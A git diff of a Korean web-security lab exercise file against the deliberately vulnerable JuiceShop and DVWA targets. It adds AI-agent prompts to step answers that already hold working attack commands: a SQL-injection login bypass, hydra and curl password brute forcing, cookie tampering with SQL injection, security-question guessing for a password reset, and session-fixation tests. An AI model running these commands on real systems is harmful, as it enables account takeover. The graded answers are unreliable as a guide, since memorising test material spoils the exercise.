@@ -19,9 +19,11 @@ steps:
   hint: email 필드에 admin@juice-sh.op'-- 를 넣으면 WHERE 절의 패스워드 검증이 주석 처리됩니다.
   category: exploit
   points: 10
-  answer: "curl -s \\\n     -X POST http://10.20.30.80:3000/rest/user/login \\\n \
-    \    -H 'Content-Type: application/json' \\\n     -d '{\"email\":\"admin@juice-sh.op'\\\
-    ''--\",\"password\":\"anything\"}'"
+  answer: "\U0001F916 프롬프트: JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오.\
+    \ admin@juice-sh.op 계정에 패스워드 없이 로그인해줘\n\U0001F4CE 참고 (CLI): curl -s \\\n     -X\
+    \ POST http://10.20.30.80:3000/rest/user/login \\\n     -H 'Content-Type: application/json'\
+    \ \\\n     -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"\
+    }'"
   answer_detail: SQL Injection으로 인증 우회는 가장 대표적인 공격입니다. admin@juice-sh.op'-- 를 입력하면
     SQL이 WHERE email='admin@juice-sh.op'--' AND password='...' 가 되어 주석(--) 이후의 패스워드
     조건이 무시됩니다.
@@ -42,9 +44,12 @@ steps:
   hint: hydra -l admin -P 패스워드파일 http-post-form 형태를 사용하세요. 실패 메시지(Login failed)를 지정합니다.
   category: exploit
   points: 12
-  answer: echo -e 'password\nadmin\n123456\nletmein\ntest' > /tmp/dvwa_pass.txt &&
-    hydra -l admin -P /tmp/dvwa_pass.txt 10.20.30.80 -s 8080 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login
-    failed' -t 4 -f 2>/dev/null | tail -5
+  answer: '🤖 프롬프트: hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를
+    찾아라해줘
+
+    📎 참고 (CLI): echo -e ''password\nadmin\n123456\nletmein\ntest'' > /tmp/dvwa_pass.txt
+    && hydra -l admin -P /tmp/dvwa_pass.txt 10.20.30.80 -s 8080 http-post-form ''/login.php:username=^USER^&password=^PASS^&Login=Login:Login
+    failed'' -t 4 -f 2>/dev/null | tail -5'
   answer_detail: hydra는 네트워크 로그인 크래커로, HTTP 폼, SSH, FTP 등 다양한 프로토콜을 지원합니다. -l은 사용자명,
     -P는 패스워드 사전 파일, http-post-form은 폼 기반 인증을 공격합니다. -f는 첫 성공시 중단합니다.
   verify:
@@ -65,7 +70,9 @@ steps:
     포함되면 성공입니다.
   category: exploit
   points: 12
-  answer: 'for pw in admin password 123456 letmein; do RESP=$(curl -s -b ''PHPSESSID=test;security=low''
+  answer: '🤖 프롬프트: DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행해줘
+
+    📎 참고 (CLI): for pw in admin password 123456 letmein; do RESP=$(curl -s -b ''PHPSESSID=test;security=low''
     "http://10.20.30.80:8080/vulnerabilities/brute/?username=admin&password=$pw&Login=Login"
     2>/dev/null); if echo "$RESP" | grep -q ''Welcome''; then echo "FOUND: password=$pw";
     break; fi; echo "FAIL: $pw"; done'
@@ -87,8 +94,11 @@ steps:
   hint: curl -I로 Set-Cookie 헤더를 확인하세요. 각 속성의 유무를 판단합니다.
   category: recon
   points: 10
-  answer: 'echo ''=== DVWA Session Cookie Analysis ==='' && COOKIE_HEADER=$(curl -sI
-    -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php
+  answer: '🤖 프롬프트: DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를
+    확인해줘
+
+    📎 참고 (CLI): echo ''=== DVWA Session Cookie Analysis ==='' && COOKIE_HEADER=$(curl
+    -sI -d ''username=admin&password=password&Login=Login'' http://10.20.30.80:8080/login.php
     | grep -i set-cookie) && echo "Raw: $COOKIE_HEADER" && echo $COOKIE_HEADER | grep
     -qi httponly && echo ''HttpOnly: SET'' || echo ''HttpOnly: MISSING (XSS cookie
     theft possible)'' && echo $COOKIE_HEADER | grep -qi secure && echo ''Secure: SET''
@@ -116,7 +126,9 @@ steps:
   hint: 먼저 인증 없이 세션 ID를 획득하고, 그 세션 ID로 로그인한 후에도 같은 세션 ID가 유지되는지 비교하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== Session Fixation Test ==='' && PRE_SESSION=$(curl -sI http://10.20.30.80:8080/login.php
+  answer: '🤖 프롬프트: 세션 고정(Session Fixation) 공격 가능성을 분석해줘
+
+    📎 참고 (CLI): echo ''=== Session Fixation Test ==='' && PRE_SESSION=$(curl -sI http://10.20.30.80:8080/login.php
     | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'') && echo "Before login:
     $PRE_SESSION" && POST_SESSION=$(curl -sI -b "$PRE_SESSION" -d ''username=admin&password=password&Login=Login''
     http://10.20.30.80:8080/login.php | grep -i ''set-cookie'' | grep -o ''PHPSESSID=[^;]*'')
@@ -146,7 +158,10 @@ steps:
     다양한 답변을 시도하세요.
   category: exploit
   points: 12
-  answer: 'echo ''=== Security Questions ==='' && curl -s http://10.20.30.80:3000/api/SecurityQuestions/
+  answer: '🤖 프롬프트: 패스워드 재설정 기능의 취약점을 분석하시오. JuiceShop의 보안 질문 목록을 확인하고, admin 계정의 보안
+    질문 답변을 추측하여 패스워드를 변경해줘
+
+    📎 참고 (CLI): echo ''=== Security Questions ==='' && curl -s http://10.20.30.80:3000/api/SecurityQuestions/
     | python3 -c "import sys,json; [print(f''{q[\"id\"]}: {q[\"question\"]}'') for
     q in json.load(sys.stdin).get(''data'',[])]" 2>/dev/null && echo ''=== Password
     Reset Attempts ==='' && for ANS in ''Samuel'' ''Mr. N. Flansen'' ''West-2'' ''Snook'';
@@ -178,9 +193,11 @@ steps:
   hint: curl -b 'PHPSESSID=세션값;security=low'로 쿠키를 변조하여 /vulnerabilities/sqli/에 접근하세요.
   category: exploit
   points: 10
-  answer: "curl -s -c /tmp/dvwa_auth13.txt \\\n  -d 'username=admin&password=password&Login=Login'\
-    \ http://10.20.30.80:8080/login.php -L > /dev/null && echo '=== Low Level SQLi\
-    \ ===' && curl -s -b /tmp/dvwa_auth13.txt -b 'security=low' \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit\"\
+  answer: "\U0001F916 프롬프트: 쿠키 변조를 통한 권한 상승을 시도하시오. DVWA의 security 쿠키를 변조하여 보안 레벨을\
+    \ 낮추고, SQL Injection을 수행해줘\n\U0001F4CE 참고 (CLI): curl -s -c /tmp/dvwa_auth13.txt\
+    \ \\\n  -d 'username=admin&password=password&Login=Login' http://10.20.30.80:8080/login.php\
+    \ -L > /dev/null && echo '=== Low Level SQLi ===' && curl -s -b /tmp/dvwa_auth13.txt\
+    \ -b 'security=low' \"http://10.20.30.80:8080/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit\"\
     \ \\\n | grep -o 'First name:[^<]*' | head -3"
   answer_detail: 보안 레벨을 클라이언트 쿠키로 관리하는 것은 근본적인 설계 결함입니다. 쿠키는 클라이언트가 자유롭게 변조할 수 있으므로,
     보안 설정은 반드시 서버 측 세션에 저장하고 서버에서만 검증해야 합니다.
@@ -202,7 +219,9 @@ steps:
   hint: '세 가지 경우를 순차적으로 테스트하세요: 토큰 없음, 유효한 토큰, 변조된 토큰.'
   category: defense
   points: 8
-  answer: 'echo ''=== No Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami
+  answer: '🤖 프롬프트: JuiceShop의 /rest/user/whoami 엔드포인트로 인증 상태를 확인해줘
+
+    📎 참고 (CLI): echo ''=== No Token ==='' && curl -s http://10.20.30.80:3000/rest/user/whoami
     | head -c 200 && echo '''' && echo ''=== Valid Token ==='' && TOKEN=$(curl -s
     -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json''
     -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' |
@@ -232,7 +251,8 @@ steps:
   hint: SQL Injection 인증 우회, 브루트포스, 세션 고정, 쿠키 보안 속성 부재, 보안 질문 약점 등을 포함하세요.
   category: reporting
   points: 12
-  answer: "cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 종합 보고서 ===\n대상: JuiceShop\
+  answer: "\U0001F916 프롬프트: 인증/세션 보안 종합 평가를 수행하시오 구현 방법과 예시를 설명해줘\n\U0001F4CE 참고 (CLI):\
+    \ cat > /tmp/auth_report.txt << 'EOF'\n=== 인증/세션 관리 취약점 종합 보고서 ===\n대상: JuiceShop\
     \ + DVWA (10.20.30.80)\n\n[CRITICAL]\n1. SQL Injection 인증 우회 (JuiceShop)\n   방어:\
     \ Prepared Statement, ORM 사용\n\n[HIGH]\n2. 브루트포스 Rate Limiting 부재\n   방어: 5회 실패시\
     \ 30초 잠금 + CAPTCHA\n3. 세션 고정(Session Fixation) 취약\n   방어: 로그인시 session_regenerate_id()\n\
@@ -281,7 +301,18 @@ steps:
     field: stdout
   target_vm: attacker
   risk_level: low
-  answer: ''
+  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
+
+    1) JuiceShop(:3000)의 로그인 API에 SQL Injection으로 관리자 인증을 우회하시오. admin@juice-sh.op
+    계정에 패스워드 없이 로그인해줘
+
+    2) hydra를 사용하여 DVWA(:8080)의 로그인 페이지에 브루트포스 공격을 수행하시오. admin 계정의 패스워드를 찾아라해줘
+
+    3) DVWA의 Brute Force 페이지에서 curl을 이용한 수동 브루트포스를 수행해줘
+
+    4) DVWA의 세션 쿠키 보안 속성을 분석하시오. HttpOnly, Secure, SameSite 플래그 설정 여부를 확인해줘
+
+    5) 세션 고정(Session Fixation) 공격 가능성을 분석해줘'
   answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
     다단계 작업.
   script: ''
